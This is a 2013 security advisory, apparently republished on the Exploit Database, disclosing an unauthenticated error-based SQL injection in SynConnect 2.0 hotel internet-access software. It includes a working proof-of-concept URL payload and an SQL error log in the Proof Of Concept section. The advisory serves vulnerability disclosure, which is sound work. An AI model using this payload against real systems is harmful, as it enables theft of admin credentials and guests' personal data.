CRD:
====

CRD-2013-01

Vendor:
======

Synchroweb Technology is a provider of application software, hardware and other innovative enterprise technology. They strive in development, deployment, and management of Linux and open source solutions for Internet infrastructure ranging from embedded devices to secure data center facilities throughout the Asia market.

Product:
=======

SynConnect is a PMS (Property management software) product of Synchroweb which provides High Speed Internet Access to Hotels, Airport lounge, Resort, conference centers, universities, etc.

Product link: http://www.synchroweb.com/prod_syn.php

Abstract:
=======

Cyberoam Vulnerability Research Team discovered a SQL Injection Vulnerability on the SynConnect is a PMS software.
Report-Timeline:
============
21-03-2013: Vendor notification
00-00-2013: Vendor Response/Feedback
00-00-2013: Vendor Fix/Patch
00-00-2013: Public or Non-Public Disclosure

Affected Version:
=============

Ver 2.0

Exploitation-Technique:
===================

Remote

Severity Rating:
===================

7.3 (AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:U/RC:C/CDP:MH/TD:M/CR:H/IR:H/AR:H)

Details:
=======

There is an error-based SQL injection vulnerability in SysConnect's index.php which allows attacker to steal full database including Master admin credentials and Guest's personal confidential information.

Further, login to admin portal gives attacker an overall control of guest accounts. Attacker can impersonate his identity by stealing guest's login credential.

SynConnect also offers easy payment internet access via prepaid packages or payment gateway from internet such as World Pay but, I have not checked vulnerability coverage in this area.

Vulnerable Module(s):

index.php?func=logoff&loginid=

Vulnerable Parameter:

loginid

--------------SQL Error Logs------------

Fatal error: SQL-statement failed: select * from user_master,group_master,package_master where user_master.userid='1011' AND (SELECT 8975 FROM(SELECT COUNT(*),CONCAT((SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bhdresh'='bhdresh' and user_master.groupid=group_master.groupid and user_master.pkgid=package_master.pkgid
MySQL said Duplicate entry 'synconnect1' for key 'group_key' (1062).

----------------------------------------------

Caveats / Prerequisites:
======================

No Prerequisites

Proof Of Concept:
================

Vulnerability can be exploited by remote attacker without authentication. For demonstration or reproduce ...

http://localhost/index.php?func=logoff&loginid=1011' AND (SELECT 8975 FROM(SELECT COUNT(*),CONCAT((SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bhdresh'='bhdresh

===========

The information provided in this advisory is provided as it is without any warranty. Any modified copy or reproduction, including partially usages, of this file requires authorization from Cyberoam Vulnerability Research Team. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Cyberoam Vulnerability Research Team.

The first attempt at contact will be through any appropriate contacts or formal mechanisms listed on the vendor Web site, or by sending an e-mail with the pertinent information about the vulnerability. Simultaneous with the vendor being notified, Cyberoam may distribute vulnerability protection filters to its customers' IPS devices through the IPS upgrades.

If a vendor fails to respond after five business days, Cyberoam Vulnerability Research Team may issue a public advisory disclosing its findings fifteen business days after the initial contact.

If a vendor response is received within the timeframe outlined above, Cyberoam Vulnerability Research Team will allow the vendor 6-months to address the vulnerability with a patch. At the end of the deadline if a vendor is not responsive or unable to provide a reasonable statement as to why the vulnerability is not fixed, the Cyberoam Vulnerability Research Team will publish a limited advisory to enable the defensive community to protect the user. We believe that by doing so the vendor will understand the responsibility they have to their customers and will react appropriately.

Cyberoam Vulnerability Research Team will make every effort to work with vendors to ensure they understand the technical details and severity of a reported security flaw. If a product vendor is unable to, or chooses not to, patch a particular security flaw, Cyberoam Vulnerability Research Team will offer to work with that vendor to publicly disclose the flaw with some effective workarounds.

Before public disclosure of a vulnerability, Cyberoam Vulnerability Research Team may share technical details of the vulnerability with other security vendors who are in a position to provide a protective response to a broader user base.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
